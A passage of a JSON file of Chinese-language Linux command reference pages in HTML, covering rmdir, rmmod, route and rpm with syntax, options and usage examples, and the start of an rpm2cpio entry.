        "body": "<h1 id=\"rmdir\">rmdir</h1>\n<p>用来删除空目录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rmdir命令</strong> 用来删除空目录。当目录不再被使用时，或者磁盘空间已到达使用限定值，就需要删除失去使用价值的目录。利用rmdir命令可以从一个目录中删除一个或多个空的子目录。该命令从一个目录中删除一个或多个子目录，其中dirname佬表示目录名。如果dirname中没有指定路径，则删除当前目录下由dirname指定的目录；如dirname中包含路径，则删除指定位置的目录。删除目录时，必须具有对其父目录的写权限。</p>\n<p>注意：子目录被删除之前应该是空目录。就是说，该目录中的所有文件必须用rm命令全部，另外，当前工作目录必须在被删除目录之上，不能是被删除目录本身，也不能是被删除目录的子目录。</p>\n<p>虽然还可以用带有<code>-r</code>选项的rm命令递归删除一个目录中的所有文件和该目录本身，但是这样做存在很大的危险性。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rmdir</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p或--parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除；</span>\n<span class=\"hljs-deletion\">--ignore-fail-on-non-empty：此选项使rmdir命令忽略由于删除非空目录时导致的错误信息；</span>\n<span class=\"hljs-deletion\">-v或-verboes：显示命令的详细执行过程；</span>\n<span class=\"hljs-deletion\">--help：显示命令的帮助信息；</span>\n<span class=\"hljs-deletion\">--version：显示命令的版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录列表：要删除的空目录列表。当删除多个空目录时，目录名之间使用空格隔开。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将工作目录下，名为 <code>www</code> 的子目录删除 :</p>\n<pre><code class=\"language-shell\">rmdir www\n</code></pre>\n<p>在工作目录下的 www 目录中，删除名为 Test 的子目录。若 Test 删除后，www 目录成为空目录，则 www 亦予删除。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">rmdir</span> -p www/<span class=\"hljs-keyword\">Test</span>\n</code></pre>\n<p>下面命令等价于 <code>rmdir a/b/c</code>, <code>rmdir a/b</code>, <code>rmdir a</code></p>\n<pre><code class=\"language-shell\">rmdir -<span class=\"hljs-selector-tag\">p</span> <span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span>/c\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "rmmod",
        "des": "从运行的内核中移除指定的内核模块",
        "body": "<h1 id=\"rmmod\">rmmod</h1>\n<p>从运行的内核中移除指定的内核模块</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rmmod命令</strong> 用于从当前运行的内核中移除指定的内核模块。执行rmmod指令，可删除不需要的模块。Linux操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rmmod</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：显示指令执行的详细信息；</span>\n<span class=\"hljs-deletion\">-f：强制移除模块，使用此选项比较危险；</span>\n<span class=\"hljs-deletion\">-w：等待着，直到模块能够被除时在移除模块；</span>\n<span class=\"hljs-deletion\">-s：向系统日志（syslog）发送错误信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>模块名：要移除的模块名称。</p>\n<h3 id=\"实例\">实例</h3>\n<p>用rmmod命令主要用于卸载正在使用的Linux内核模块，与<code>modprobe -r</code>命令相似，如下所示：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> boot]<span class=\"hljs-meta\"># lsmod | grep raid1</span>\nraid1                  <span class=\"hljs-number\">25153</span>  <span class=\"hljs-number\">0</span>\n\n[root<span class=\"hljs-symbol\">@localhost</span> boot]<span class=\"hljs-meta\"># rmmod raid1</span>\n[root<span class=\"hljs-symbol\">@localhost</span> boot]<span class=\"hljs-meta\"># lsmod | grep raid1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "route",
        "des": "显示并设置Linux中静态路由表",
        "body": "<h1 id=\"route\">route</h1>\n<p>显示并设置Linux中静态路由表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>route命令</strong> 用来显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。</p>\n<p>在Linux系统中设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的ip地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在<code>/etc/rc.local</code>中添加route命令来保证该路由设置永久有效。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">route</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-A：设置地址类型；</span>\n<span class=\"hljs-deletion\">-C：打印将Linux核心的路由缓存；</span>\n<span class=\"hljs-deletion\">-v：详细信息模式；</span>\n<span class=\"hljs-deletion\">-n：不执行DNS反向查找，直接显示数字形式的IP地址；</span>\n<span class=\"hljs-deletion\">-e：netstat格式显示路由表；</span>\n<span class=\"hljs-deletion\">-net：到一个网络的路由表；</span>\n<span class=\"hljs-deletion\">-host：到一个主机的路由表。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">Add</span>：增加指定的路由记录；\nDel：删除指定的路由记录；\nTarget：目的网络或目的主机；\ngw：设置默认网关；\nmss：设置TCP的最大区块长度（MSS），单位MB；\n<span class=\"hljs-keyword\">window</span>：指定通过路由表的TCP连接的TCP窗口大小；\ndev：路由记录所表示的网络接口。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>显示当前路由：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[root@localhost ~]</span># route\nKernel IP routing table\nDestination&nbsp;&nbsp;&nbsp;&nbsp; Gateway&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Genmask&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flags Metric Ref&nbsp;&nbsp;&nbsp; Use Iface\n<span class=\"hljs-number\">112.124.12.0</span>&nbsp;&nbsp;&nbsp; *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">252</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp; U&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth1\n<span class=\"hljs-number\">10.160.0.0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">240</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp; U&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">192.168.0.0</span>&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>&nbsp;&nbsp; <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp; UG&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">172.16.0.0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>&nbsp;&nbsp; <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">240</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp; UG&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">10.0.0.0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>&nbsp;&nbsp; <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UG&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth0\ndefault&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">112</span>.<span class=\"hljs-number\">124</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>&nbsp; <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UG&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class=\"hljs-number\">0</span> eth1\n\n<span class=\"hljs-string\">[root@localhost ~]</span># route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n<span class=\"hljs-number\">112.124.12.0</span>    <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>         <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">252</span>.<span class=\"hljs-number\">0</span>   U     <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth1\n<span class=\"hljs-number\">10.160.0.0</span>      <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>         <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">240</span>.<span class=\"hljs-number\">0</span>   U     <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">192.168.0.0</span>     <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>   <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>     UG    <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">172.16.0.0</span>      <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>   <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">240</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>     UG    <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">10.0.0.0</span>        <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>   <span class=\"hljs-number\">255</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>       UG    <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth0\n<span class=\"hljs-number\">0.0.0.0</span>         <span class=\"hljs-number\">112</span>.<span class=\"hljs-number\">124</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span>  <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">0</span>         UG    <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">0</span> eth1\n</code></pre>\n<p>其中Flags为路由标志，标记当前网络节点的状态，Flags标志说明：</p>\n<ul>\n<li><p>  U Up表示此路由当前为启动状态。</p>\n</li>\n<li><p>  H Host，表示此网关为一主机。</p>\n</li>\n<li><p>  G Gateway，表示此网关为一路由器。</p>\n</li>\n<li><p>  R Reinstate Route，使用动态路由重新初始化的路由。</p>\n</li>\n<li><p>  D Dynamically,此路由是动态性地写入。</p>\n</li>\n<li><p>  M Modified，此路由是由路由守护程序或导向器动态修改。</p>\n</li>\n<li><p>  ! 表示此路由当前为关闭状态。</p>\n</li>\n<li><p><em>添加网关/设置网关：</em>* </p>\n</li>\n</ul>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">route</span> add -net <span class=\"hljs-number\">224.0.0.0</span> netmask <span class=\"hljs-number\">240.0.0.0</span> dev eth0    <span class=\"hljs-comment\">#增加一条到达244.0.0.0的路由。</span>\n</code></pre>\n<p> <strong>屏蔽一条路由：</strong> </p>\n<pre><code class=\"language-shell\">route <span class=\"hljs-keyword\">add</span> -net <span class=\"hljs-number\">224.0</span>.<span class=\"hljs-number\">0.0</span> netmask <span class=\"hljs-number\">240.0</span>.<span class=\"hljs-number\">0.0</span> reject     #增加一条屏蔽的路由，目的地址为<span class=\"hljs-number\">224</span>.<span class=\"hljs-keyword\">x</span>.<span class=\"hljs-keyword\">x</span>.<span class=\"hljs-keyword\">x</span>将被拒绝。\n</code></pre>\n<p> <strong>删除路由记录：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">route</span> del -net <span class=\"hljs-number\">224.0.0.0</span> netmask <span class=\"hljs-number\">240.0.0.0</span>\nroute del -net <span class=\"hljs-number\">224.0.0.0</span> netmask <span class=\"hljs-number\">240.0.0.0</span> reject\n</code></pre>\n<p> <strong>删除和添加设置默认网关：</strong> </p>\n<pre><code class=\"language-shell\">route del<span class=\"hljs-built_in\"> default </span>gw 192.168.120.240<span class=\"hljs-built_in\">\nroute </span><span class=\"hljs-built_in\">add</span><span class=\"hljs-built_in\"> default </span>gw 192.168.120.240\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpm",
        "des": "RPM软件包的管理工具",
        "body": "<h1 id=\"rpm\">rpm</h1>\n<p>RPM软件包的管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>rpm命令</strong> 是RPM软件包的管理工具。rpm原本是Red&nbsp;Hat&nbsp;Linux发行版专门用来管理Linux各项套件的程序，由于它遵循GPL规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM套件管理方式的出现，让Linux易于安装，升级，间接提升了Linux的适用度。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">rpm</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：查询所有套件；</span>\n<span class=\"hljs-deletion\">-b&lt;完成阶段&gt;&lt;套件档&gt;+或-t &lt;完成阶段&gt;&lt;套件档&gt;+：设置包装套件的完成阶段，并指定套件档的文件名称；</span>\n<span class=\"hljs-deletion\">-c：只列出组态配置文件，本参数需配合\"-l\"参数使用；</span>\n<span class=\"hljs-deletion\">-d：只列出文本文件，本参数需配合\"-l\"参数使用；</span>\n<span class=\"hljs-deletion\">-e&lt;套件档&gt;或--erase&lt;套件档&gt;：删除指定的套件；</span>\n<span class=\"hljs-deletion\">-f&lt;文件&gt;+：查询拥有指定文件的套件；</span>\n<span class=\"hljs-deletion\">-h或--hash：套件安装时列出标记；</span>\n<span class=\"hljs-deletion\">-i：显示套件的相关信息；</span>\n<span class=\"hljs-deletion\">-i&lt;套件档&gt;或--install&lt;套件档&gt;：安装指定的套件档；</span>\n<span class=\"hljs-deletion\">-l：显示套件的文件列表；</span>\n<span class=\"hljs-deletion\">-p&lt;套件档&gt;+：查询指定的RPM套件档；</span>\n<span class=\"hljs-deletion\">-q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户；</span>\n<span class=\"hljs-deletion\">-R：显示套件的关联性信息；</span>\n<span class=\"hljs-deletion\">-s：显示文件状态，本参数需配合\"-l\"参数使用；</span>\n<span class=\"hljs-deletion\">-U&lt;套件档&gt;或--upgrade&lt;套件档&gt;：升级指定的套件档；</span>\n<span class=\"hljs-deletion\">-v：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">-vv：详细显示指令执行过程，便于排错。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>软件包：指定要操纵的rpm软件包。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>如何安装rpm软件包</strong></p>\n<p>rpm软件包的安装可以使用程序rpm来完成。执行下面的命令：</p>\n<pre><code class=\"language-shell\">rpm -ivh your-<span class=\"hljs-keyword\">package</span>.rpm\n</code></pre>\n<p>其中your-package.rpm是你要安装的rpm包的文件名，一般置于当前目录下。</p>\n<p>安装过程中可能出现下面的警告或者提示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-params\">...</span> conflict <span class=\"hljs-keyword\">with</span> <span class=\"hljs-params\">...</span>\n</code></pre>\n<p>可能是要安装的包里有一些文件可能会覆盖现有的文件，缺省时这样的情况下是无法正确安装的可以用<code>rpm --force -i</code>强制安装即可</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">...</span> <span class=\"language-python\"><span class=\"hljs-keyword\">is</span> needed by ...</span>\n<span class=\"hljs-meta\">...</span> <span class=\"language-python\"><span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> installed ...</span>\n</code></pre>\n<p>此包需要的一些软件你没有安装可以用<code>rpm --nodeps -i</code>来忽略此信息，也就是说<code>rpm -i --force --nodeps</code>可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。</p>\n<p> <strong>如何安装.src.rpm软件包</strong></p>\n<p>有些软件包是以.src.rpm结尾的，这类软件包是包含了源代码的rpm包，在安装时需要进行编译。这类软件包有两种安装方法：</p>\n<p>方法一：</p>\n<pre><code class=\"language-shell\">rpm -i your-package.src.rpm\ncd <span class=\"hljs-regexp\">/usr/</span>src<span class=\"hljs-regexp\">/redhat/</span>SPECS\nrpmbuild -bp your-package.specs             <span class=\"hljs-comment\">#一个和你的软件包同名的specs文件</span>\ncd <span class=\"hljs-regexp\">/usr/</span>src<span class=\"hljs-regexp\">/redhat/</span>BUILD<span class=\"hljs-regexp\">/your-package/</span>      <span class=\"hljs-comment\">#一个和你的软件包同名的目录</span>\n./configure                                 <span class=\"hljs-comment\">#这一步和编译普通的源码软件一样，可以加上参数</span>\nmake\nmake install\n</code></pre>\n<p>方法二：</p>\n<pre><code class=\"language-shell\">rpm -i you-<span class=\"hljs-keyword\">package</span>.src.rpm\ncd <span class=\"hljs-regexp\">/usr/</span>src<span class=\"hljs-regexp\">/redhat/</span>SPECS\n</code></pre>\n<p>前两步和方法一相同</p>\n<pre><code class=\"language-shell\">rpmbuild -bb your-<span class=\"hljs-keyword\">package</span>.specs       <span class=\"hljs-meta\">#一个和你的软件包同名的specs文件</span>\n</code></pre>\n<p>这时在<code>/usr/src/redhat/RPM/i386/</code>（根据具体包的不同，也可能是i686,noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。</p>\n<p>执行<code>rpm -i new-package.rpm</code>即可安装完成。</p>\n<p> <strong>如何卸载rpm软件包</strong></p>\n<p>使用命令<code>rpm -e</code>包名，包名可以包含版本号等信息，但是不可以有后缀.rpm，比如卸载软件包proftpd-1.2.8-1，可以使用下列格式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">8</span>\n<span class=\"hljs-attribute\">rpm</span> -e proftpd-\n<span class=\"hljs-attribute\">rpm</span> -e proftpd\n</code></pre>\n<p>不可以是下列格式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">1</span>.i386.rpm\n<span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">1</span>.i386\n<span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span>\n<span class=\"hljs-attribute\">rpm</span> -e proftpd-<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>有时会出现一些错误或者警告：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-params\">...</span> is needed <span class=\"hljs-keyword\">by</span> <span class=\"hljs-params\">...</span>\n</code></pre>\n<p>这说明这个软件被其他软件需要，不能随便卸载，可以用rpm -e --nodeps强制卸载</p>\n<p> <strong>如何不安装但是获取rpm包中的文件</strong></p>\n<p>使用工具rpm2cpio和cpio</p>\n<pre><code class=\"language-shell\">rpm2cpio xxx.rpm <span class=\"hljs-string\">| cpio -vi</span>\nrpm2cpio xxx.rpm <span class=\"hljs-string\">| cpio -idmv</span>\nrpm2cpio xxx.rpm <span class=\"hljs-string\">| cpio --extract --make-directories</span>\n</code></pre>\n<p>参数i和extract相同，表示提取文件。v表示指示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。</p>\n<p> <strong>如何查看与rpm包相关的文件和其他信息</strong></p>\n<p>下面所有的例子都假设使用软件包mysql-3.23.54a-11</p>\n<p>1、我的系统中安装了那些rpm软件包。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -qa 讲列出所有安装过的包\n</code></pre>\n<p>如果要查找所有安装过的包含某个字符串sql的软件包</p>\n<pre><code class=\"language-shell\">rpm -<span class=\"hljs-keyword\">qa</span> | <span class=\"hljs-keyword\">grep</span> sql\n</code></pre>\n<p>2、如何获得某个软件包的文件全名。</p>\n<pre><code class=\"language-shell\">rpm -<span class=\"hljs-selector-tag\">q</span> mysql\n</code></pre>\n<p>可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本等信息。这个例子中可以得到信息mysql-3.23.54a-11</p>\n<p>3、一个rpm包中的文件安装到那里去了？</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">rpm</span> -ql 包名\n</code></pre>\n<p>注意这里的是不包括.rpm后缀的软件包的名称，也就是说只能用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用which，比如：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">which</span> mysql\n</code></pre>\n<p>4、一个rpm包中包含那些文件。</p>\n<ul>\n<li>  一个没有安装过的软件包，使用<code>rpm -qlp  **** .rpm</code></li>\n<li>  一个已经安装过的软件包，还可以使用<code>rpm -ql  **** .rpm</code></li>\n</ul>\n<p>5、如何获取关于一个软件包的版本，用途等相关信息？</p>\n<ul>\n<li>  一个没有安装过的软件包，使用<code>rpm -qip  **** .rpm</code></li>\n<li>  一个已经安装过的软件包，还可以使用<code>rpm -qi  **** .rpm</code></li>\n</ul>\n<p>6、某个程序是哪个软件包安装的，或者哪个软件包包含这个程序。</p>\n<pre><code class=\"language-shell\">rpm -qf `which 程序名`    #返回软件包的全名\nrpm -qif `which 程序名`   #返回软件包的有关信息\nrpm -qlf `which 程序名`   #返回软件包的文件列表\n</code></pre>\n<p>注意，这里不是引号，而是<code>，就是键盘左上角的那个键。也可以使用</code>rpm -qilf`，同时输出软件包信息和文件列表。</p>\n<p>7、某个文件是哪个软件包安装的，或者哪个软件包包含这个文件。</p>\n<p>注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用whereis或者which，然后使用<code>rpm -qf</code>例如：</p>\n<pre><code class=\"language-shell\">whereis ftptop\nftptop: <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/ftptop /u</span>sr<span class=\"hljs-regexp\">/share/m</span>an<span class=\"hljs-regexp\">/man1/</span>ftptop.<span class=\"hljs-number\">1</span>.gz\n\nrpm -qf <span class=\"hljs-regexp\">/usr/</span>bin/ftptop\nproftpd-<span class=\"hljs-number\">1.2</span>.<span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">1</span>\n\nrpm -qf <span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/doc/</span>proftpd-<span class=\"hljs-number\">1.2</span>.<span class=\"hljs-number\">8</span><span class=\"hljs-regexp\">/rfc/</span>rfc0959.txt\nproftpd-<span class=\"hljs-number\">1.2</span>.<span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">1</span>\n</code></pre>\n<h2 id=\"更多实例\">更多实例</h2>\n<blockquote>\n<p>库依赖: <a href=\"http://rpmfind.net/\">http://rpmfind.net/</a></p>\n</blockquote>\n<p>源码包 -&gt; 编译 -&gt; 二进制包(rpm 包 / 系统默认包)</p>\n<p>rpm 命名规则: 软件(软件名, 软件版本) + 系统(os 版本, os 位数)\nrpm 校验: SM5DLUGT -&gt; size modified(类型/权限) md5 device L(文件路径) user group time(modified time)</p>\n<p>yum: 解决 rpm 依赖的问题</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># rpm</span>\nmysql57-community-release-el6-<span class=\"hljs-number\">8</span>.noarch.rpm <span class=\"hljs-comment\"># 一个 rpm 包的例子</span>\n<span class=\"hljs-regexp\">/var/</span>lib<span class=\"hljs-regexp\">/rpm/</span> <span class=\"hljs-comment\"># 包全名 -&gt; 包名 的数据库</span>\n\nrpm -Uivh --dodeps xxx <span class=\"hljs-comment\"># upgrade install verbose hash</span>\nrpm -qilpfa|grep xxx <span class=\"hljs-comment\"># query info list(rpm包安装后的文件位置) package(rpm 包) file(文件属于哪个rpm文件) all</span>\nrpm -e <span class=\"hljs-comment\"># erase</span>\nrpm -V <span class=\"hljs-comment\"># verify</span>\nrpm2cpio | cpio -idv\n\n<span class=\"hljs-comment\"># rpm 默认安装位置</span>\n<span class=\"hljs-regexp\">/etc/</span>           配置文件\n<span class=\"hljs-regexp\">/usr/</span>bin/       可执行文件\n<span class=\"hljs-regexp\">/urs/</span>lib/       程序使用的函数库\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/doc/</span> 使用手册\n<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/man/</span> manual\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "rpm2cpio",
        "des": "将RPM软件包转换为cpio格式的文件",
